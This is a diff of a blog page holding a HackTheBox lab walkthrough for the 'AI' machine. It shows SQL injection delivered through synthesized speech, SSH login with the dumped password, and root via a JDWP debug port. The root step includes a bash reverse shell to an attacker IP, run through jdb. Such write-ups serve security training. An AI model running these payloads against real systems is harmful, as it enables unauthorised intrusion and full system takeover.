@@ -61,11 +61,141 @@ Starting gobuster in directory enumeration mode
 /db.php               (Status: 200) [Size: 0]
 /intelligence.php     (Status: 200) [Size: 38674]
 /ai.php               (Status: 200) [Size: 37569]
-</code></pre><h2 id=foothold>Foothold</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><h2 id=foothold>Foothold</h2><ul><li><code>uploads</code> and <code>images</code> return <code>403</code><ul><li><code>about.php</code> returns description</li></ul></li></ul><p><img src=./images/2.png alt></p><ul><li><code>intelligence.php</code> and <code>ai.php</code> look interesting</li></ul><p><img src=./images/3.png alt></p><p><img src=./images/4.png alt></p><ul><li>So we can upload a <code>wav</code> which will be interpreted by their <code>AI</code> api<ul><li>I can use <a href=https://www.text2speech.org/ target=_blank rel=noopener>https://www.text2speech.org/</a> to generate voice queries</li><li>I set voice to <code>US Male</code> according to a note in <code>intelligence.php</code></li></ul></li></ul><p><img src=./images/5.png alt></p><ul><li>I received no results for my query<ul><li>Since we have a query, let&rsquo;s send special chars to see if something happens</li><li>I&rsquo;ll generate a <code>wav</code> with <code>open single quote</code> speech</li><li>And I receive a <code>SQL</code> error</li></ul></li></ul><p><img src=./images/6.png alt></p><ul><li>The potential attack path is to generate <code>sql</code> injection speech<ul><li>We can now script the process using <code>flite</code></li><li><code>apt install flite</code></li></ul></li></ul><pre tabindex=0><code>└─$ flite -w speech.wav -voice rms -t &#34;Hello&#34;
+</code></pre><pre tabindex=0><code>└─$ curl -s -X POST http://10.10.10.163/ai.php -F &#39;fileToUpload=@speech.wav;type=audio/x-wav&#39; -F &#39;submit=Process It!&#39;
+&lt;!DOCTYPE html&gt;
+...
+</code></pre><pre tabindex=0><code>└─$ curl -s -X POST http://10.10.10.163/ai.php -F &#39;fileToUpload=@speech.wav;type=audio/x-wav&#39; -F &#39;submit=Process It!&#39; | grep &#39;Query result :&#39; | sed &#39;s/&lt;br \/&gt;/\n/g&#39; | sed &#39;s/&lt;h3&gt;//g&#39;
+Our understanding of your input is : hello
+Query result :
+</code></pre><ul><li>Let&rsquo;s make a script</li></ul><pre tabindex=0><code>#!/bin/bash
+
+flite -w speech.wav -voice rms -t &#34;$1&#34;
+resp=$(curl -s -X POST http://10.10.10.163/ai.php -F &#39;fileToUpload=@speech.wav;type=audio/x-wav&#39; -F &#39;submit=Process It!&#39; | grep &#39;Query result :&#39; | sed &#39;s/&lt;br \/&gt;/\n/g&#39; | sed &#39;s/&lt;h3&gt;//g&#39;)
+echo -e &#34;$resp&#34;
+</code></pre><pre tabindex=0><code>└─$ ./ai.sh &#34;hello&#34;
+Our understanding of your input is : hello
+Query result : 
+</code></pre><ul><li>Now let&rsquo;s try to perform <code>sqli</code><ul><li>We saw a hint from <code>intelligence.php</code> about <code>Comment Database</code> which will result in <code>-- -</code></li><li>We can perform basic injection and dump version</li></ul></li></ul><pre tabindex=0><code>└─$ ./ai.sh &#34;open single quote space union select version open parenthesis close parenthesis comment database&#34;
+Our understanding of your input is : &#39;  union select version()-- -
+Query result : 5.7.27-0ubuntu0.18.04.1
+</code></pre><ul><li>It&rsquo;s really difficult to generate complicated <code>sqli</code> speech requests, so we should stick to basic queries<ul><li>We could assume that there&rsquo;s a <code>users</code> database</li><li>If we try to dump it, we have a hit</li></ul></li></ul><pre tabindex=0><code>└─$ ./ai.sh &#34;open single quote space union select space username space from users comment database&#34;                       
+Our understanding of your input is : &#39;  union select   username   from users -- -
+Query result : alexa
+</code></pre><pre tabindex=0><code>└─$ ./ai.sh &#34;open single quote space union select space password space from users comment database&#34;
+Our understanding of your input is : &#39;  union select   password   from users -- -
+Query result : H,Sq9t6}a&lt;)?q93_
+</code></pre><ul><li>We can <code>ssh</code></li></ul><pre tabindex=0><code>└─$ sshpass -p &#39;H,Sq9t6}a&lt;)?q93_&#39; ssh alexa@10.10.10.163
+Warning: Permanently added &#39;10.10.10.163&#39; (ED25519) to the list of known hosts.
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Oct 26 15:07:09 UTC 2023
+
+  System load:  0.03              Processes:           145
+  Usage of /:   72.5% of 4.79GB   Users logged in:     0
+  Memory usage: 29%               IP address for eth0: 10.10.10.163
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+63 packages can be updated.
+15 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Thu Oct 24 15:04:38 2019 from 192.168.0.104
+alexa@AI:~$
+</code></pre><h2 id=root>Root</h2><ul><li>Nothing interesting in <code>sudo</code> and other directories<ul><li>But <code>netstat</code> shows other ports</li></ul></li></ul><pre tabindex=0><code>alexa@AI:~$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN      -                   
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:58072           0.0.0.0:*                           -                   
+udp6       0      0 :::5353                 :::*                                -                   
+udp6       0      0 :::42345                :::*                                -    
+</code></pre><ul><li><code>3306</code> is database<ul><li><code>8000</code> and <code>8080</code> is <code>tomcat</code> running as <code>root</code></li></ul></li></ul><pre tabindex=0><code>alexa@AI:~$ ps auxww
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root          1  0.0  0.4 225172  8740 ?        Ss   Oct25   0:06 /sbin/init auto automatic-ubiquity noprompt
+...
+root      55849  0.0  0.0      0     0 ?        I    15:09   0:00 [kworker/0:1-eve]
+root      56126  3.2  5.1 3108796 102548 ?      Sl   15:18   0:03 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
+</code></pre><ul><li><code>-agentlib:jdwp=transport=dt_socket,address=localhost:8000</code> option indicates that <code>debug</code> mode is enabled and on port <code>8000</code><ul><li>We can configure port forwarding<ul><li><code>sshpass -p 'H,Sq9t6}a&lt;)?q93_' ssh alexa@10.10.10.163 -L 8000:localhost:8000</code></li></ul></li><li>We can use <a href=https://github.com/IOActive/jdwp-shellifier target=_blank rel=noopener>jdwp-shellifier</a><ul><li><a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol target=_blank rel=noopener>https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol</a></li></ul></li><li>First I create <code>rev.sh</code> on target box</li></ul></li></ul><pre tabindex=0><code>#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/10.10.16.3/6666 0&gt;&amp;1
+</code></pre><ul><li>Then we execute <a href=https://github.com/IOActive/jdwp-shellifier target=_blank rel=noopener>jdwp-shellifier</a><ul><li>But it my case it didn&rsquo;t work</li></ul></li></ul><pre tabindex=0><code>└─$ python2.7 ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd &#39;/tmp/rev.sh&#39;
+[+] Targeting &#39;127.0.0.1:8000&#39;
+[+] Reading settings for &#39;OpenJDK 64-Bit Server VM - 11.0.4&#39;
+[+] Found Runtime class: id=aa0
+[+] Found Runtime.getRuntime(): id=7fea50023ae0
+[+] Created break event id=2
+[+] Waiting for an event on &#39;java.net.ServerSocket.accept&#39;
+[-] Exception: unpack requires a string argument of length 11
+</code></pre><ul><li>So let&rsquo;s do it manually<ul><li><a href=https://dl.packetstormsecurity.net/1307-exploits/JDWP-exploitation.txt target=_blank rel=noopener>https://dl.packetstormsecurity.net/1307-exploits/JDWP-exploitation.txt</a></li><li><a href=https://notes.qazeer.io/l7/methodology-20 target=_blank rel=noopener>https://notes.qazeer.io/l7/methodology-20</a></li></ul></li></ul><pre tabindex=0><code>└─$ jdb -attach 8000
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+Initializing jdb ...
+&gt; 
+</code></pre><pre tabindex=0><code>&gt; classes
+** classes list **
+sun.reflect.annotation.AnnotationParser$$Lambda$97.677120200
+...
+java.lang.Runtime
+...
+</code></pre><pre tabindex=0><code>&gt; methods java.lang.Runtime
+** methods list **
+...
+java.lang.Runtime exec(java.lang.String[])
+...
+</code></pre><ul><li>Then we trace methods</li></ul><pre tabindex=0><code>&gt; trace go methods
+Method entered: &gt; &#34;thread=http-nio-127.0.0.1-8080-BlockPoller&#34;, org.apache.tomcat.util.net.NioBlockingSelector$BlockPoller.events(), line=280 bci=0
+Method entered: &#34;thread=http-nio-127.0.0.1-8080-BlockPoller&#34;, org.apache.tomcat.util.collections.SynchronizedQueue.size(), line=93 bci=0
+Method entered: &#34;thread=ajp-nio-127.0.0.1-8009-BlockPoller&#34;, org.apache.tomcat.util.net.NioBlockingSelector$BlockPoller.events(), line=280 bci=0
+Method entered: &#34;thread=ajp-nio-127.0.0.1-8009-BlockPoller&#34;, org.apache.tomcat.util.collections.SynchronizedQueue.size(), line=93 bci=0
+Method entered: &#34;thread=http-nio-127.0.0.1-8080-BlockPoller&#34;, org.apache.tomcat.util.net.NioBlockingSelector$BlockPoller.events(), line=280 bci=0
+Method entered: &#34;thread=http-nio-127.0.0.1-8080-BlockPoller&#34;, org.apache.tomcat.util.collections.SynchronizedQueue.size(), line=93 bci=0
+Method exited: return value = 0, &#34;thread=http-nio-127.0.0.1-8080-BlockPoller&#34;, org.apache.tomcat.util.collections.SynchronizedQueue.size(), line=97 bci=22
+...
+</code></pre><ul><li>We then set a breakpoint on method: <code>stop in org.apache.tomcat.util.collections.SynchronizedQueue.size()</code><ul><li>Then when we hit a breakpoint, send <code>print new java.lang.Runtime().exec("/tmp/rev.sh")</code></li></ul></li></ul><pre tabindex=0><code>└─$ jdb -attach 8000
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+Initializing jdb ...
+&gt; stop in org.apache.tomcat.util.collections.SynchronizedQueue.size()
+Set breakpoint org.apache.tomcat.util.collections.SynchronizedQueue.size()
+&gt; 
+Breakpoint hit: &#34;thread=ajp-nio-127.0.0.1-8009-BlockPoller&#34;, org.apache.tomcat.util.collections.SynchronizedQueue.size(), line=93 bci=0
+
+ajp-nio-127.0.0.1-8009-BlockPoller[1] print new java.lang.Runtime().exec(&#34;/tmp/rev.sh&#34;)
+</code></pre><p><img src=./images/7.png alt></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fai%2f&text=%5bHTB%5d%20Machine%3a%20AI&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
 <a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fai%2f&title=%5bHTB%5d%20Machine%3a%20AI" target=_blank><i class="fab fa-reddit"></i></a>
 <a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fai%2f&title=%5bHTB%5d%20Machine%3a%20AI" target=_blank><i class="fab fa-linkedin"></i></a>
 <a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20AI&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fai%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/linux/ai/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
-Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/agile/ title="[HTB] Machine: Agile" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Agile</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/antique/ title="[HTB] Machine: Antique" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Antique</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
+Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/agile/ title="[HTB] Machine: Agile" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Agile</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/antique/ title="[HTB] Machine: Antique" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Antique</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
 Toha</a></div><div class="col-md-4 text-center">© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
 <img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.6ea41b538638987eca0365babdf28c3aa16adbc59643343c39865362e701c943.js integrity="sha256-bqQbU4Y4mH7KA2W6vfKMOqFq28WWQzQ8OYZTYucByUM=" defer></script></body></html>
